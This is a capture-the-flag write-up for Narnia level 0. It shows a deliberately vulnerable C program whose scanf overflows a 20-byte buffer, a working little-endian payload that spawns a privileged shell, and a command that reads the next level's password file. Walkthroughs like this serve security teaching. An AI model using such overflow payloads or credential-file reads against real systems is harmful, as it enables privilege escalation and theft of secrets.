# Narnia Level 0
This level serves as an introduction to the Narnia wargame. It is a simple buffer overflow exploit with nothing protecting the program from a user with a little bit of C knowledge and a penchant for putting more than 20 characters in a text input.

```
int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

The buffer is sized 20, but the code contains a scanf() function taking in 24 bytes. If you can put in four bytes that equal "0xdeadbeef" at the end of the string, you will beat the challenge. Since these bytes can't simply be typed into the text input, you need to craft a payload that is then placed into the text input automatically when the program runs. You must also take into account that x86 and x86_64 are little-endian, so the bytes need to be flipped in the input. The payload below will cause the program to place you in a privileged shell, from which you can read the password for narnia1:

```
(printf 'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde';cat;) | ./narnia0
```

Finally, run the below command in the privileged shell to read the password for narnia1. The password is SHA256-hashed at the end of this document.

```
cat /etc/narnia_pass/narnia1
```

Hashed narnia1 password: cc2501971139590abd8545d14f1858ff7e4cbd7db1389aceb7a283426b12dd34